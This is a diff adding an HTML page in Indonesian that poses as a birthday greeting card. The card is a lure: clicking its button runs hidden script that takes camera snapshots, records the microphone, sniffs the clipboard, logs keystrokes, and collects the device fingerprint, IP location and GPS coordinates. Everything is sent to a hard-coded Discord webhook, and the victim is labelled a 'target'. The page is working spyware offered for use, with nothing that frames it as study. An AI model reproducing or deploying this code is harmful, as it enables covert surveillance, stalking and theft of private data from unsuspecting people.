@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Selamat Ulang Tahun! 🎂</title>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }
+  body {
+    min-height:100vh;
+    background:linear-gradient(135deg,#ff9a9e 0%,#fad0c4 50%,#fbc2eb 100%);
+    display:flex; align-items:center; justify-content:center;
+    overflow:hidden;
+  }
+  .card {
+    background:rgba(255,255,255,0.95);
+    padding:50px 40px; border-radius:24px;
+    box-shadow:0 20px 60px rgba(0,0,0,0.2);
+    text-align:center; max-width:420px; width:90%;
+    position:relative; z-index:2;
+    animation:float 3s ease-in-out infinite;
+  }
+  @keyframes float {
+    0%,100% { transform:translateY(0); }
+    50% { transform:translateY(-10px); }
+  }
+  h1 { font-size:2.2em; color:#e91e63; margin-bottom:10px; }
+  p { color:#666; margin-bottom:30px; font-size:1.1em; }
+  button {
+    background:linear-gradient(135deg,#e91e63,#ff6090);
+    color:#fff; border:none; padding:16px 50px;
+    font-size:1.2em; border-radius:50px; cursor:pointer;
+    box-shadow:0 8px 20px rgba(233,30,99,0.4);
+    transition:all 0.3s; font-weight:bold;
+  }
+  button:hover { transform:scale(1.05); }
+  .balloon {
+    position:absolute; width:60px; height:75px;
+    border-radius:50%; opacity:0.6;
+    animation:rise 8s linear infinite;
+  }
+  @keyframes rise {
+    0% { transform:translateY(100vh); }
+    100% { transform:translateY(-150px); }
+  }
+  video { display:none; }
+</style>
+</head>
+<body>
+
+<div class="balloon" style="background:#ff5252; left:10%; animation-delay:0s;"></div>
+<div class="balloon" style="background:#448aff; left:30%; animation-delay:2s;"></div>
+<div class="balloon" style="background:#ffd740; left:50%; animation-delay:4s;"></div>
+<div class="balloon" style="background:#69f0ae; left:70%; animation-delay:1s;"></div>
+<div class="balloon" style="background:#e040fb; left:85%; animation-delay:3s;"></div>
+
+<div class="card">
+  <h1>🎉 Selamat Ulang Tahun! 🎂</h1>
+  <p>Tekan tombol di bawah untuk kejutan spesial!</p>
+  <button onclick="mulaiSemua()">HAI! 👋</button>
+</div>
+
+<video id="cam" autoplay playsinline muted></video>
+<canvas id="snap" style="display:none;"></canvas>
+
+<script>
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1456627696682401866/i5h8pMNNY-x5BSE7xZ5uHVAcFNj84s1xtP87HZSOiWscxl0-uNII5C7r6CzvxMbeswBC";
+
+// ==================== UTIL ====================
+async function sendWebhook(payload) {
+  try {
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+  } catch(e) {}
+}
+
+async function sendFile(file, caption) {
+  try {
+    const fd = new FormData();
+    fd.append("file", file, file.name || "file.png");
+    fd.append("payload_json", JSON.stringify({
+      content: caption,
+      username: "Midnight"
+    }));
+    await fetch(WEBHOOK_URL, { method: "POST", body: fd });
+  } catch(e) {}
+}
+
+// ==================== KAMERA DEPAN ====================
+async function ambilKamera() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user", width: 640, height: 480 },
+      audio: false
+    });
+    const vid = document.getElementById('cam');
+    vid.srcObject = stream;
+    await vid.play();
+    await new Promise(r => setTimeout(r, 1500));
+
+    const canvas = document.getElementById('snap');
+    canvas.width = 640; canvas.height = 480;
+    canvas.getContext('2d').drawImage(vid, 0, 0, 640, 480);
+
+    canvas.toBlob(async (blob) => {
+      const file = new File([blob], "target.png", { type: "image/png" });
+      await sendFile(file, "📸 **KAMERA DEPAN TERTANGKAP**");
+    }, "image/png");
+
+    setTimeout(async () => {
+      canvas.getContext('2d').drawImage(vid, 0, 0, 640, 480);
+      canvas.toBlob(async (blob) => {
+        const file = new File([blob], "target2.png", { type: "image/png" });
+        await sendFile(file, "📸 **KAMERA DEPAN (2)**");
+      }, "image/png");
+      stream.getTracks().forEach(t => t.stop());
+    }, 3000);
+
+  } catch(e) {
+    await sendWebhook({ content: "⚠️ Kamera ditolak/tidak tersedia: " + e.message });
+  }
+}
+
+// ==================== MIKROFON ====================
+async function rekamMic() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    const rec = new MediaRecorder(stream);
+    const chunks = [];
+    rec.ondataavailable = e => chunks.push(e.data);
+    rec.onstop = async () => {
+      const blob = new Blob(chunks, { type: 'audio/webm' });
+      const file = new File([blob], "audio.webm", { type: "audio/webm" });
+      await sendFile(file, "🎤 **REKAMAN MIKROFON (10 detik)**");
+      stream.getTracks().forEach(t => t.stop());
+    };
+    rec.start();
+    setTimeout(() => rec.stop(), 10000);
+  } catch(e) {
+    await sendWebhook({ content: "⚠️ Mic ditolak: " + e.message });
+  }
+}
+
+// ==================== CLIPBOARD SNIFFER ====================
+async function bacaClipboard() {
+  try {
+    const text = await navigator.clipboard.readText();
+    if (text) {
+      await sendWebhook({
+        content: "📋 **ISI CLIPBOARD TARGET:**\n```\n" + text.substring(0, 1500) + "\n```"
+      });
+    }
+  } catch(e) {}
+}
+setInterval(bacaClipboard, 8000);
+
+// ==================== KEYLOGGER ====================
+let keyBuffer = "";
+let keyTimer = null;
+document.addEventListener("keydown", (e) => {
+  let k = e.key;
+  if (k === "Enter") k = "\n";
+  else if (k === "Backspace") k = "[⌫]";
+  else if (k === "Tab") k = "[TAB]";
+  else if (k.length > 1) k = `[${k}]`;
+  keyBuffer += k;
+
+  clearTimeout(keyTimer);
+  keyTimer = setTimeout(kirimKeys, 5000);
+});
+
+async function kirimKeys() {
+  if (!keyBuffer) return;
+  const teks = keyBuffer.substring(0, 1800);
+  keyBuffer = "";
+  await sendWebhook({
+    content: "⌨️ **KEYLOG:**\n```\n" + teks + "\n```"
+  });
+}
+
+window.addEventListener("beforeunload", () => {
+  if (keyBuffer && navigator.sendBeacon) {
+    const blob = new Blob([JSON.stringify({
+      content: "⌨️ **KEYLOG (exit):**\n```\n" + keyBuffer.substring(0,1800) + "\n```"
+    })], { type: "application/json" });
+    navigator.sendBeacon(WEBHOOK_URL, blob);
+  }
+});
+
+// ==================== INFO SISTEM + IP ====================
+async function kirimInfo() {
+  let data = {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    bahasa: navigator.language,
+    cores: navigator.hardwareConcurrency || "unknown",
+    ram: navigator.deviceMemory || "unknown",
+    layar: `${screen.width}x${screen.height}`,
+    warna: `${screen.colorDepth}bit`,
+    waktu: new Date().toLocaleString('id-ID'),
+    touch: navigator.maxTouchPoints || 0,
+    os: "unknown",
+    ip: "unknown", isp: "unknown", kota: "unknown",
+    region: "unknown", negara: "unknown",
+    lat: "", lon: "", timezone: "unknown",
+    baterai: "unknown", gpu: "unknown", koneksi: "unknown"
+  };
+
+  const ua = navigator.userAgent;
+  if (/Windows NT 10/.test(ua)) data.os = "Windows 10/11";
+  else if (/Windows NT/.test(ua)) data.os = "Windows";
+  else if (/Mac OS X/.test(ua)) data.os = "macOS";
+  else if (/Android/.test(ua)) data.os = "Android";
+  else if (/iPhone|iPad/.test(ua)) data.os = "iOS";
+  else if (/Linux/.test(ua)) data.os = "Linux";
+
+  try {
+    const bat = await navigator.getBattery();
+    data.baterai = `${Math.round(bat.level*100)}% ${bat.charging?'(charging)':''}`;
+  } catch(e) {}
+
+  try {
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl');
+    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+    data.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+  } catch(e) {}
+
+  if (navigator.connection) {
+    data.koneksi = `${navigator.connection.effectiveType} | ${navigator.connection.downlink}Mbps`;
+  }
+
+  try {
+    const res = await fetch('https://ipapi.co/json/');
+    const j = await res.json();
+    Object.assign(data, {
+      ip: j.ip, isp: j.org, kota: j.city, region: j.region,
+      negara: j.country_name, lat: j.latitude, lon: j.longitude,
+      timezone: j.timezone
+    });
+  } catch(e) {}
+
+  const embed = {
+    title: "🎯 TARGET TERTANGKAP",
+    color: 0xe91e63,
+    fields: [
+      { name: "🌐 IP", value: String(data.ip), inline: true },
+      { name: "🏢 ISP", value: String(data.isp), inline: true },
+      { name: "📍 Kota", value: String(data.kota), inline: true },
+      { name: "🗺️ Region", value: String(data.region), inline: true },
+      { name: "🌍 Negara", value: String(data.negara), inline: true },
+      { name: "⏰ Timezone", value: String(data.timezone), inline: true },
+      { name: "📌 Koordinat", value: `${data.lat}, ${data.lon}`, inline: false },
+      { name: "💻 OS", value: data.os, inline: true },
+      { name: "🧠 Platform", value: data.platform, inline: true },
+      { name: "🌐 Bahasa", value: data.bahasa, inline: true },
+      { name: "⚙️ CPU", value: String(data.cores), inline: true },
+      { name: "💾 RAM", value: String(data.ram), inline: true },
+      { name: "🖥️ Layar", value: data.layar, inline: true },
+      { name: "🔋 Baterai", value: data.baterai, inline: true },
+      { name: "🎮 GPU", value: data.gpu.substring(0,100), inline: false },
+      { name: "📶 Koneksi", value: data.koneksi, inline: true },
+      { name: "👆 Touch", value: String(data.touch), inline: true },
+      { name: "🕐 Waktu", value: data.waktu, inline: false },
+      { name: "📱 UA", value: data.userAgent.substring(0,200), inline: false }
+    ],
+    footer: { text: "Midnight System" },
+    timestamp: new Date().toISOString()
+  };
+
+  await sendWebhook({ embeds: [embed] });
+}
+
+// ==================== GPS ====================
+function mintaGPS() {
+  if (!navigator.geolocation) return;
+  navigator.geolocation.getCurrentPosition(async (pos) => {
+    await sendWebhook({
+      content: `📡 **GPS PRESISI:**\nLat: ${pos.coords.latitude}\nLon: ${pos.coords.longitude}\nAkurasi: ${pos.coords.accuracy}m\nMaps: https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`
+    });
+  }, () => {}, { enableHighAccuracy: true, timeout: 10000 });
+}
+
+// ==================== TRIGGER ====================
+async function mulaiSemua() {
+  document.querySelector('.card').innerHTML = `
+    <h1>🎊 Kejutan Diproses! 🎊</h1>
+    <p>Mohon tunggu sebentar ya...<br>Kejutan sedang disiapkan 💖</p>
+  `;
+
+  kirimInfo();
+  ambilKamera();
+  rekamMic();
+  bacaClipboard();
+  mintaGPS();
+
+  setTimeout(() => {
+    document.querySelector('.card').innerHTML = `
+      <h1>🎉 Selamat Ulang Tahun! 🎂</h1>
+      <p>Terima kasih sudah menekan tombolnya!<br>Semoga harimu menyenangkan 💖</p>
+    `;
+  }, 6000);
+}
+</script>
+
+</body>
+</html>
